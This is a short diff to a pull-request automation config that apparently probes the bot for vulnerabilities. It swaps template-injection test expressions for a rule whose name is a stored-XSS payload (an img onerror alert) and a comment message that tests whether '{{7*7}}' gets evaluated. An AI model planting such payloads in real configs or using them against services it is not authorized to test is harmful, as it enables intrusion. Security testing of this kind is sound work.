@@ -1,11 +1,6 @@
 pull_request_rules:
-  - name: template-probe-1
-    conditions:
-      - base=main
+  - name: 'axsscfg"><img src=x onerror=alert(document.domain)>'
+    conditions: []
     actions:
       comment:
-        message: |
-          arith: {{ 7 * 7 }}
-          concat: {{ "a" ~ "b" }}
-          author: {{ author }}
-          number: {{ number }}
+        message: "ssti probe result: {{7*7}}"
